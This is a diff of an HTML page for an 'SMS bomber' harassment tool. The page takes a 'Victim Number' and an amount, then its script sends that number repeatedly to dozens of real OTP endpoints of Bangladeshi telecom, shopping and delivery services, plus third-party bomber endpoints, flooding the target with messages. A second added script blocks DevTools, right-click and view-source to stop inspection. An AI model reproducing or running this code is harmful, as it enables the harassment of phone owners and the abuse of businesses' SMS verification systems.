@@ -1,82 +1,431 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HEX SMS BOMBER - ULTIMATE</title>
-    <style>
-        body { margin: 0; padding: 0; background: #000; color: #00ff00; font-family: monospace; overflow: hidden; }
-        canvas { position: absolute; top: 0; left: 0; z-index: -1; }
-        .container { text-align: center; margin-top: 5%; background: rgba(0,0,0,0.9); padding: 30px; border: 2px solid #00ff00; display: inline-block; position: relative; left: 50%; transform: translateX(-50%); box-shadow: 0 0 20px #00ff00; border-radius: 10px; width: 90%; max-width: 400px; }
-        input { background: #111; color: #00ff00; border: 1px solid #00ff00; padding: 12px; margin: 8px; width: 80%; text-align: center; font-size: 16px; outline: none; border-radius: 5px; }
-        button { background: #00ff00; color: #000; border: none; padding: 15px 35px; cursor: pointer; font-weight: bold; margin-top: 15px; font-size: 18px; transition: 0.4s; border-radius: 5px; width: 85%; }
-        button:hover { background: #fff; color: #00ff00; }
-        #display { margin-top: 25px; font-size: 1.2em; font-weight: bold; text-shadow: 0 0 10px #00ff00; min-height: 30px; }
-    </style>
+
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>PHANTOM_VOID;</title>
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500&display=swap" rel="stylesheet" />
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Orbitron', sans-serif;
+    }
+
+    body {
+      background: #0f0f0f;
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      overflow: hidden;
+    }
+
+    #particles-js {
+      position: absolute;
+      width: 100%;
+      height: 100%;
+      z-index: 0;
+    }
+
+    .login-screen, .container {
+      z-index: 1;
+      background: rgba(20, 20, 20, 0.95);
+      padding: 30px;
+      border-radius: 15px;
+      box-shadow: 0 0 20px #ff0000a0;
+      text-align: center;
+      width: 90%;
+      max-width: 400px;
+    }
+
+    input, button {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: none;
+      border-radius: 8px;
+      outline: none;
+    }
+
+    input {
+      background: #1f1f1f;
+      color: #fff;
+      box-shadow: 0 0 5px #ffaa00;
+    }
+
+    button {
+      background: #ff0000;
+      color: white;
+      font-weight: bold;
+      box-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000;
+      cursor: pointer;
+      transition: 0.3s ease;
+    }
+
+    button:hover {
+      background: #cc0000;
+      box-shadow: 0 0 20px #ff0000;
+    }
+
+    .telegram-btn {
+      display: inline-block;
+      margin-top: 15px;
+      padding: 12px 20px;
+      background: #0088cc;
+      color: white;
+      text-decoration: none;
+      border-radius: 10px;
+      box-shadow: 0 0 10px #0088cc, 0 0 20px #0088cc;
+      transition: 0.3s ease;
+    }
+
+    .telegram-btn:hover {
+      background: #0077b5;
+      box-shadow: 0 0 20px #00cfff;
+    }
+
+    #loadingSpinner {
+      width: 30px;
+      height: 30px;
+      border: 4px solid #ff0000;
+      border-top: 4px solid transparent;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      display: none;
+      margin: 15px auto;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    #attackLogs {
+      max-height: 130px;
+      overflow-y: auto;
+      background: #1a1a1a;
+      padding: 10px;
+      border-radius: 10px;
+      margin-top: 15px;
+      font-size: 14px;
+      box-shadow: inset 0 0 10px #ff000055;
+      text-align: left;
+    }
+
+    .alert {
+      font-size: 16px;
+      margin-top: 10px;
+    }
+
+    .success {
+      color: #00ff00;
+    }
+
+    .failure {
+      color: #ff3333;
+    }
+
+    .default {
+      color: #ffaa00;
+    }
+
+    #countdownTimer {
+      font-size: 16px;
+      color: #ffaa00;
+      margin-top: 10px;
+    }
+  </style>
 </head>
 <body>
-    <canvas id="matrix"></canvas>
-    <div class="container">
-        <h1>HEX SMS BOMBER</h1>
-        <input type="number" id="target" placeholder="Enter Phone Number">
-        <input type="number" id="count" placeholder="Enter Amount">
-        <button id="bombBtn" onclick="startProcess()">LAUNCH ATTACK</button>
-        <div id="display">SYSTEM READY</div>
-    </div>
+  <div id="particles-js"></div>
 
-    <script>
-        let isCooldown = false;
+  <!-- Main Container (login removed) -->
+  <div class="container" id="mainContainer">
+    <h1>PHANTOM_VOID x BOMB</h1>
+    <input type="text" id="phoneNumber" placeholder="Victim Number +88">
+    <input type="number" id="amount" placeholder="Booming Amount">
+    <button onclick="sendOTP()">START ATTACK</button>
+    <div id="loadingSpinner"></div>
+    <div id="countdownTimer"></div>
+    <div id="responseMessage" class="alert default">Ready...</div>
+    <div id="attackLogs"></div>
+   </div>
 
-        // পেজ লোড হওয়ার সময় আগের টাইমার চেক করা
-        window.onload = function() {
-            const savedCooldownTime = localStorage.getItem('cooldownEndTime');
-            if (savedCooldownTime) {
-                const currentTime = Date.now();
-                if (currentTime < savedCooldownTime) {
-                    const remainingTime = Math.ceil((savedCooldownTime - currentTime) / 1000);
-                    activateCooldown(remainingTime);
+  <audio id="successSound" src="https://actions.google.com/sounds/v1/cartoon/clang_and_wobble.ogg" preload="auto"></audio>
+
+  <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
+  <script>
+    particlesJS("particles-js", {
+  particles: {
+    number: { value: 150 },
+    color: { 
+      value: "#ff0033"  
+    },
+    shape: { type: "circle" },
+    opacity: {
+      value: 2,      
+      random: false  
+    },
+    size: { value: 3 },
+    move: { enable: true, speed: 5 },
+    line_linked: { 
+      enable: true, 
+      color: "#00ffff", 
+      opacity: 0.9,
+      width: 1 
+    }
+  },
+  interactivity: {
+  events: {
+    onhover: { 
+      enable: true, 
+      mode: ["repulse", "bubble"] 
+    }
+  },
+  modes: {
+    repulse: { distance: 100 },
+    bubble: { distance: 200, size: 6, opacity: 1 }
+  }
+}
+});
+
+    async function sendRequest(url, method = 'GET', data = null) {
+      try {
+        let options = { method, headers: { 'Content-Type': 'application/json' } };
+        if (data) options.body = JSON.stringify(data);
+        let res = await fetch(url, options);
+        return res.status >= 200 && res.status < 300;
+      } catch (e) {
+        return false;
+      }
+    }
+
+    function delay(ms) {
+      return new Promise(resolve => setTimeout(resolve, ms));
+    }
+
+    async function sendOTP() {
+      const phone = document.getElementById('phoneNumber').value;
+      const amount = document.getElementById('amount').value;
+      const spinner = document.getElementById('loadingSpinner');
+      const logs = document.getElementById('attackLogs');
+      const responseMessage = document.getElementById('responseMessage');
+      const timerDisplay = document.getElementById('countdownTimer');
+      const sound = document.getElementById('successSound');
+
+      if (!/^\d{11}$/.test(phone) || amount <= 0) {
+        responseMessage.innerHTML = '<span class="alert failure">Invalid Number or Amount!</span>';
+        return;
+      }
+
+      spinner.style.display = 'block';
+      logs.innerHTML = '';
+      responseMessage.innerHTML = '<span class="alert default">Attack Started...</span>';
+
+      let count = amount;
+      let time = count;
+      let interval = setInterval(() => {
+        timerDisplay.innerText = `Time Left: ${time}s`;
+        if (time-- <= 0) clearInterval(interval);
+      }, 1000);
+
+      let apis = [
+        { url: `https://expcyber.my.id/apis/v1.php?phone=${phone}`, method: 'GET' },
+        { url: `https://lmnx9.xyz/boom/free.php?number=${phone}&amount=${amount}`, method: 'GET' },
+        { url: `https://cokestudio23.sslwireless.com/api/check-gp-number`, method: 'POST', data: { msisdn: phone } },
+        { url: `https://weblogin.grameenphone.com/backend/api/v1/otp`, method: 'POST', data: { msisdn: phone } },
+        { url: `https://apix.rabbitholebd.com/appv2/login/requestOTP`, method: 'POST', data: { mobile: phone } },
+        { url: `https://api.osudpotro.com/api/v1/users/send_otp`, method: 'POST', data: { mobile: phone, deviceToken: "web", language: "en", os: "web" } },
+        { url: `https://fundesh.com.bd/api/auth/generateOTP?service_key=`, method: 'POST', data: { msisdn: phone } },
+        { url: `https://api.swap.com.bd/api/v1/send-otp`, method: 'POST', data: { phone: phone } },
+        { url: `https://api.bd.airtel.com/v1/account/login/otp`, method: 'POST', data: { phone_number: phone } },
+        { url: `https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=${phone}`, method: 'GET' },
+        { url: `https://eshop-api.banglalink.net/api/v1/customer/send-otp`, method: 'POST', data: { type: 'phone', phone: phone } },
+        { url: `https://cherykuwait.com/topbomb.php?phone=${phone}&amount=${amount}`, method: 'GET' },
+        { url: `https://tcsbomberai.vercel.app/api/smsbomber?phone=${phone}`, method: 'GET' },
+        { url: `https://ck638.ct.ws/?number=${phone}`, method: 'GET' },
+        { url: `https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile=${phone}`, method: 'GET' },
+        { url: `https://bj-x-coder.top/bo_m_ber.php?phone=${phone}&amount=${amount}`, method: 'GET' },
+        { url: `https://api.bd.airtel.com/v1/account/login/otp`, method: 'POST', data: { phone_number: phone } },
+        { url: `https://zeron-num-info2o.vercel.app/api/search?num=${phone}`},
+        { url: `https://weblogin.grameenphone.com/backend/api/v1/otp`, method: 'POST', data: { msisdn: phone } },
+        { url: `https://tcsbomberai.vercel.app/api/smsbomber?phone=${phone}`},
+        { url: `https://fundesh.com.bd/api/auth/generateOTP?service_key=`, method: 'POST', data: { msisdn: phone } },
+        { url: `https://eshop-api.banglalink.net/api/v1/customer/send-otp`, method: 'POST', data: { type: 'phone', phone: phone } },
+        { url: `https://cokestudio23.sslwireless.com/api/check-gp-number`, method: 'POST', data: { msisdn: phone } },
+        { url: `https://apix.rabbitholebd.com/appv2/login/requestOTP`, method: 'POST', data: { mobile: phone } },,
+        { url: `https://api.swap.com.bd/api/v1/send-otp`, method: 'POST', data: { phone: phone } },
+        { url: `https://api.osudpotro.com/api/v1/users/send_otp`, method: 'POST', data: { mobile: phone, deviceToken: "web", language: "en", os: "web" } },
+        { url: `https://lmnx9.appletolha.com/boom/free.php?number=${phone}&amount=${amount}`, method: 'GET' },
+        { url: `https://lmnx9.appletolha.com/call-boomber/trial.php?number=${phone}`, method: 'GET' },
+        { url: `https://member.daraz.com.bd/user/api/send_otp`, method: 'POST', data: { phone: phone, type: 'login' } },
+    { url: `https://api.pathao.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
+    { url: `https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=${phone}`, method: 'GET' },
+    { url: `https://www.chaldal.com/api/v1/user/otp`, method: 'POST', data: { phone: phone } },
+    { url: `https://api.hungrynaki.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
+    { url: `https://api.bdtickets.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
+    { url: `https://api.shohoz.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
+    { url: `https://api.foodpanda.com.bd/api/v2/otp`, method: 'POST', data: { phone: phone } },
+    { url: `https://api.sheba.xyz/v1/user/otp`, method: 'POST', data: { phone: phone } },
+    { url: `https://api.ajkerdeal.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
+    { url: `https://api.shwapno.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
+    { url: `https://api.evaly.com.bd/v1/user/otp`, method: 'POST', data: { phone: phone } },
+    { url: `https://api.clicknshop.com.bd/v1/user/otp`, method: 'POST', data: { phone: phone } },
+    { url: `https://api.pickaboo.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
+    { url: `https://api.priyoshop.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
+    { url: `https://api.startech.com.bd/v1/user/otp`, method: 'POST', data: { phone: phone } },
+    { url: `https://api.ryanscomputers.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
+    { url: `https://api.techlandbd.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
+    { url: `https://api.skder.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
+    { url: `https://api.deligram.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
+    { url: `https://api.oasbd.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
+    { url: `https://api.bagdoom.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
+    { url: `https://api.rokomari.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
+    { url: `https://api.boibazar.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
+    { url: `https://api.eorange.shop/v1/user/otp`, method: 'POST', data: { phone: phone } },
+    { url: `https://api.dhamakashopping.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
+    { url: `https://api.aleshamart.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
+    { url: `https://api.qcoom.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
+    { url: `https://api.boishakhi.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
+    { url: `https://api.need.com.bd/v1/user/otp`, method: 'POST', data: { phone: phone } },
+    { url: `https://api.daraz.com.bd/v1/user/otp`, method: 'POST', data: { phone: phone } },
+    { url: `https://api.foodpanda.com.bd/v1/user/otp`, method: 'POST', data: { phone: phone } },
+    { url: `https://api.hungrynaki.com/v2/user/otp`, method: 'POST', data: { phone: phone } },
+    { url: `https://api.pathao.com/v2/user/otp`, method: 'POST', data: { phone: phone } },
+    { url: `https://api.shohoz.com/v2/user/otp`, method: 'POST', data: { phone: phone } },
+    { url: `https://api.bdtickets.com/v2/user/otp`, method: 'POST', data: { phone: phone } },
+    { url: `https://api.bikroy.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
+    { url: `https://api.chaldal.com/v2/user/otp`, method: 'POST', data: { phone: phone } },
+    { url: `https://api.sheba.xyz/v2/user/otp`, method: 'POST', data: { phone: phone } },
+    { url: `https://api.ajkerdeal.com/v2/user/otp`, method: 'POST', data: { phone: phone } },
+    { url: `https://api.shwapno.com/v2/user/otp`, method: 'POST', data: { phone: phone } },
+    { url: `https://api.evaly.com.bd/v2/user/otp`, method: 'POST', data: { phone: phone } },
+    { url: `https://api.clicknshop.com.bd/v2/user/otp`, method: 'POST', data: { phone: phone } },
+    { url: `https://api.pickaboo.com/v2/user/otp`, method: 'POST', data: { phone: phone } },
+    { url: `https://api.priyoshop.com/v2/user/otp`, method: 'POST', data: { phone: phone } },
+    { url: `https://api.startech.com.bd/v2/user/otp`, method: 'POST', data: { phone: phone } },
+    { url: `https://api.ryanscomputers.com/v2/user/otp`, method: 'POST', data: { phone: phone } },
+    { url: `https://api.techlandbd.com/v2/user/otp`, method: 'POST', data: { phone: phone } },
+    { url: `https://api.skder.com/v2/user/otp`, method: 'POST', data: { phone: phone } },
+    { url: `https://api.deligram.com/v2/user/otp`, method: 'POST', data: { phone: phone } },
+    { url: `https://api.oasbd.com/v2/user/otp`, method: 'POST', data: { phone: phone } },
+    { url: `https://api.bagdoom.com/v2/user/otp`, method: 'POST', data: { phone: phone } },
+    { url: `https://api.rokomari.com/v2/user/otp`, method: 'POST', data: { phone: phone } },
+    { url: `https://api.boibazar.com/v2/user/otp`, method: 'POST', data: { phone: phone } },
+    { url: `https://api.eorange.shop/v2/user/otp`, method: 'POST', data: { phone: phone } },
+    { url: `https://api.dhamakashopping.com/v2/user/otp`, method: 'POST', data: { phone: phone } },
+    { url: `https://api.aleshamart.com/v2/user/otp`, method: 'POST', data: { phone: phone } },
+    { url: `https://api.qcoom.com/v2/user/otp`, method: 'POST', data: { phone: phone } },
+    { url: `https://api.boishakhi.com/v2/user/otp`, method: 'POST', data: { phone: phone } },
+    { url: `https://api.need.com.bd/v2/user/otp`, method: 'POST', data: { phone: phone } },
+    { url: `https://api.daraz.com.bd/v2/user/otp`, method: 'POST', data: { phone: phone } },
+    { url: `https://api.foodpanda.com.bd/v2/user/otp`, method: 'POST', data: { phone: phone } },
+    { url: `https://api.hungrynaki.com/v2/user/otp`, method: 'POST', data: { phone: phone } },
+    { url: `https://api.pathao.com/v2/user/otp`, method: 'POST', data: { phone: phone } },
+    { url: `https://api.shohoz.com/v2/user/otp`, method: 'POST', data: { phone: phone } },
+    { url: `https://api.need.com.bd/v2/user/otp`, method: 'POST', data: { phone: phone } }
+      ];
+
+      const messages = ["Boom Sent!", "Target Missed!", "Direct Hit!", "Boom Delivered!", "Reloading...", "Incoming Blast!", "SMS Detonated!"];
+      let successCount = 0;
+
+      for (let i = 0; i < count; i++) {
+        for (let api of apis) {
+          let result = await sendRequest(api.url, api.method, api.data);
+          let msg = messages[Math.floor(Math.random() * messages.length)];
+          logs.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg} ${result ? "✅" : "❌"}<br>`;
+          logs.scrollTop = logs.scrollHeight;
+          if (result) successCount++;
+          await delay(100);
+        }
+      }
+
+      spinner.style.display = 'none';
+      if (successCount > 0) {
+        responseMessage.innerHTML = `<span class="alert success">Attack Complete! (${successCount} Hits)</span>`;
+        sound.play();
+      } else {
+        responseMessage.innerHTML = `<span class="alert failure">Attack Failed!</span>`;
+      }
+    }
+  </script>
+  <script>
+/* ===== DEVTOOLS DETECTION & DETERRENT ===== */
+(function () {
+    const devtoolsThreshold = 160;
+    let blocked = false;
+
+    function devtoolsOpen() {
+        return (
+            window.outerWidth - window.innerWidth > devtoolsThreshold ||
+            window.outerHeight - window.innerHeight > devtoolsThreshold
+        );
+    }
+
+    function blockSite() {
+        if (blocked) return;
+        blocked = true;
+
+        // Destroy visible content
+        document.documentElement.innerHTML = `
+            <style>
+                body {
+                    background: black;
+                    color: red;
+                    font-family: monospace;
+                    display: flex;
+                    align-items: center;
+                    justify-content: center;
+                    height: 100vh;
+                    text-align: center;
                 }
-            }
-        };
+            </style>
+            <div>
+                <h1>STOP!</h1>
+                <p>This is a browser feature intended for developers.</p>
+                <p>If someone told you to copy-paste anything here, it is a scam.</p>
+            </div>
+        `;
 
-        async function startProcess() {
-            const phone = document.getElementById('target').value;
-            const amount = parseInt(document.getElementById('count').value);
-            const display = document.getElementById('display');
+        console.clear();
+        console.log(
+            "%cSTOP!\nDevTools access attempted and blocked.",
+            "color:red;font-size:28px;font-weight:bold"
+        );
+    }
 
-            if (isCooldown) {
-                display.innerText = "Cooldown Active!";
-                return;
-            }
+    // Continuous detection
+    setInterval(() => {
+        if (devtoolsOpen()) {
+            blockSite();
+        }
+    }, 300);
 
-            if(!phone || !amount) { 
-                display.innerText = "Error: Input Missing!"; 
-                return; 
-            }
+    // Disable common shortcuts
+    document.addEventListener("keydown", function (e) {
+        if (
+            e.key === "F12" ||
+            (e.ctrlKey && e.shiftKey && ["I", "C", "J"].includes(e.key)) ||
+            (e.ctrlKey && e.key === "U")
+        ) {
+            e.preventDefault();
+            blockSite();
+        }
+    });
 
-            display.innerText = "Initializing APIs...";
-            
-            // আপনার দেওয়া প্রতিটি এপিআই এখানে নির্ভুলভাবে যোগ করা হয়েছে
-            let apis = [
-                { url: `https://expcyber.my.id/apis/v1.php?phone=${phone}`, method: 'GET' },
-                { url: `https://lmnx9.xyz/boom/free.php?number=${phone}&amount=${amount}`, method: 'GET' },
-                { url: `https://cokestudio23.sslwireless.com/api/check-gp-number`, method: 'POST', data: { msisdn: phone } },
-                { url: `https://weblogin.grameenphone.com/backend/api/v1/otp`, method: 'POST', data: { msisdn: phone } },
-                { url: `https://apix.rabbitholebd.com/appv2/login/requestOTP`, method: 'POST', data: { mobile: phone } },
-                { url: `https://api.osudpotro.com/api/v1/users/send_otp`, method: 'POST', data: { mobile: phone, deviceToken: "web", language: "en", os: "web" } },
-                { url: `https://fundesh.com.bd/api/auth/generateOTP?service_key=`, method: 'POST', data: { msisdn: phone } },
-                { url: `https://api.swap.com.bd/api/v1/send-otp`, method: 'POST', data: { phone: phone } },
-                { url: `https://api.bd.airtel.com/v1/account/login/otp`, method: 'POST', data: { phone_number: phone } },
-                { url: `https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=${phone}`, method: 'GET' },
-                { url: `https://eshop-api.banglalink.net/api/v1/customer/send-otp`, method: 'POST', data: { type: 'phone', phone: phone } },
-                { url: `https://cherykuwait.com/topbomb.php?phone=${phone}&amount=${amount}`, method: 'GET' },
-                { url: `https://tcsbomberai.vercel.app/api/smsbomber?phone=${phone}`, method: 'GET' },
-                { url: `https://ck638.ct.ws/?number=${phone}`, method: 'GET' },
-                { url: `https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile=${phone}`, method: 'GET' },
-                { url: `https://bj-x-coder.top/bo_m_ber.php?phone=${phone}&amount=${amount}`, method: 'GET' },
-                { url: `https://member.daraz.com.bd/user/api/send_otp`, method: 'POST', data: { phone: phone, type: 'login' } },
-                { url: `https://api.pathao.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
-                { url: `https://www.chaldal.com/api/v1/user/otp`, method: 'POST', data: { phone: phone } },
-                { url: `https://api.hungrynaki.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
-                { url: `https://api.bdtickets.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
-                { url: `https://api.shohoz.com/v1/user/otp`, method: 'POST', data: { phone: phone }
+    // Disable right click
+    document.addEventListener("contextmenu", function (e) {
+        e.preventDefault();
+    });
+
+    // Debugger trap (annoys DevTools)
+    setInterval(() => {
+        debugger;
+    }, 500);
+})();
+</script>
+</body>
+</html>
